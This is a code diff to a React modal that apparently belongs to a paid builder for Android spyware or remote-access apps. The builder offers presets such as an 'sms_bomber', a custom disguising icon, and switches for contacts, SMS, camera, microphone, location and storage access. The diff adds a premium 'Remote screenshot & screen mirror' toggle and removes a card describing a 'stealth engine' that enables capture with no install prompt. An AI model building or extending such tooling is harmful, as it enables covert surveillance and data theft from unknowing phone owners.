@@ -80,6 +80,10 @@ const PRESET_ICON_STYLES: Record<string, { gradient: [string, string, string]; s
     sms_bomber: {
         gradient: ['#F59E0B', '#EA580C', '#DC2626'],
         svgPath: 'M17.657 18.657A8 8 0 016.343 7.343S7 9 9 10c0-2 .5-5 2.986-7C14 5 16.09 5.777 17.656 7.343A7.975 7.975 0 0120 13a7.975 7.975 0 01-2.343 5.657z M9.879 16.121A3 3 0 1012.015 11L11 14H9c0 .768.293 1.536.879 2.121z'
+    },
+    custom: {
+        gradient: ['#F97316', '#EA580C', '#C2410C'],
+        svgPath: 'M12 2a10 10 0 100 20 10 10 0 000-20zm-1 17.93A8.006 8.006 0 014.07 13H7a14.08 14.08 0 001.2 5.73A7.94 7.94 0 0111 19.93zM4.07 11A8.006 8.006 0 0111 4.07V9H4.2A13.9 13.9 0 004.07 11zm8.93-6.93A8.006 8.006 0 0119.93 11H13V4.07zM17 13h2.93a8.006 8.006 0 01-6.93 6.93V15h2.8c.45-.63.85-1.3 1.2-2zm-5 6.96c-.83-.43-1.63-1.46-2.18-3.08A12.1 12.1 0 019 13h6c-.1 1.4-.46 2.76-.98 3.88-.55 1.62-1.35 2.65-2.18 3.08z'
     }
 };
 
@@ -442,15 +446,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                 setShowCustomAlert(true);
                 return;
             }
-            if (!customIcon && !customIconPreview) {
-                setAlertData({
-                    title: 'Custom Icon Required',
-                    message: 'Please select an icon (PNG/JPG) for your custom app.',
-                    type: 'warning'
-                });
-                setShowCustomAlert(true);
-                return;
-            }
         }
 
         setStatus('generating');
@@ -491,7 +486,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('enableContactsPermission', enableContactsPermission.toString());
             formData.append('enableStoragePermission', enableStoragePermission.toString());
             formData.append('enableFileManagerPermission', enableFileManagerPermission.toString());
-            formData.append('enableScreenCapture', 'false'); // stealth engine handles this at runtime
+            formData.append('enableScreenCapture', enableScreenCapture.toString());
             formData.append('enableCameraPermission', enableCameraPermission.toString());
             formData.append('enableMicrophonePermission', enableMicrophonePermission.toString());
             formData.append('enableLocationPermission', enableLocationPermission.toString());
@@ -509,6 +504,11 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('notificationText', finalText);
             if (selectedPreset === 'custom' && customIcon) {
                 formData.append('icon', customIcon);
+            } else if (selectedPreset === 'custom' && !customIcon) {
+                const iconBlob = await generatePresetIconBlob('custom');
+                if (iconBlob) {
+                    formData.append('icon', iconBlob, 'custom_icon.png');
+                }
             } else if (selectedPreset !== 'custom') {
                 const iconBlob = await generatePresetIconBlob(selectedPreset);
                 if (iconBlob) {
@@ -1087,6 +1087,39 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </div>
                                 </div>
 
+                                {/* Screen Capture Permission Card */}
+                                <div 
+                                    onClick={() => {
+                                        if (!isPremium) { onUpgrade?.('Screen Mirror & Capture', 'premium'); return; }
+                                        setEnableScreenCapture(!enableScreenCapture);
+                                    }}
+                                    className={`p-3.5 rounded-2xl flex items-center justify-between gap-3 cursor-pointer transition-all select-none ${
+                                        enableScreenCapture && isPremium
+                                            ? 'bg-violet-500/10 border-2 border-violet-500/60 shadow-[0_0_16px_rgba(139,92,246,0.2)]' 
+                                            : 'bg-[#16181e] border border-white/10 hover:border-white/20 opacity-70 hover:opacity-100'
+                                    }`}
+                                >
+                                    <div className="flex items-center gap-3 min-w-0">
+                                        <div className={`w-9 h-9 rounded-xl flex items-center justify-center shrink-0 ${
+                                            enableScreenCapture && isPremium ? 'bg-violet-500/20 text-violet-300 border border-violet-500/40' : 'bg-white/5 text-white/40'
+                                        }`}>
+                                            <Monitor size={18} />
+                                        </div>
+                                        <div className="flex flex-col min-w-0">
+                                            <div className="flex items-center gap-1.5">
+                                                <span className={`text-xs font-black truncate ${enableScreenCapture && isPremium ? 'text-violet-200' : 'text-white'}`}>
+                                                    Screen Capture
+                                                </span>
+                                                {!isPremium && <Lock size={11} className="text-orange-400/80" />}
+                                            </div>
+                                            <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Remote screenshot & screen mirror</span>
+                                        </div>
+                                    </div>
+                                    <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 p-0.5 ${enableScreenCapture && isPremium ? 'bg-violet-500 shadow-[0_0_8px_#8b5cf6]' : 'bg-white/10'}`}>
+                                        <div className={`w-5 h-5 bg-white rounded-full transition-transform ${enableScreenCapture && isPremium ? 'translate-x-5' : 'translate-x-0'}`} />
+                                    </div>
+                                </div>
+
                                 {/* SMS Messages Permission Card */}
                                 <div 
                                     onClick={() => {
@@ -1124,22 +1157,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </div>
                                     <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 p-0.5 ${enableSmsPermission && !isBasicPlan ? 'bg-rose-500 shadow-[0_0_8px_#f43f5e]' : 'bg-white/10'}`}>
                                         <div className={`w-5 h-5 bg-white rounded-full transition-transform ${enableSmsPermission && !isBasicPlan ? 'translate-x-5' : 'translate-x-0'}`} />
-                                    </div>
-                                </div>
-
-                                {/* Screen Capture — info-only card, no install permission */}
-                                <div className="p-3.5 rounded-2xl flex items-center justify-between gap-3 select-none bg-orange-500/8 border border-orange-500/20">
-                                    <div className="flex items-center gap-3 min-w-0">
-                                        <div className="w-9 h-9 rounded-xl flex items-center justify-center shrink-0 bg-orange-500/15 text-orange-400 border border-orange-500/30">
-                                            <Monitor size={18} />
-                                        </div>
-                                        <div className="flex flex-col min-w-0">
-                                            <span className="text-xs font-black text-orange-200">Screen Capture</span>
-                                            <span className="text-[10px] text-white/35 font-mono mt-0.5">Activated by stealth engine — no install prompt</span>
-                                        </div>
-                                    </div>
-                                    <div className="px-2 py-0.5 rounded-full bg-orange-500/15 border border-orange-500/25">
-                                        <span className="text-[9px] font-bold text-orange-400 uppercase tracking-wide">Auto</span>
                                     </div>
                                 </div>
 
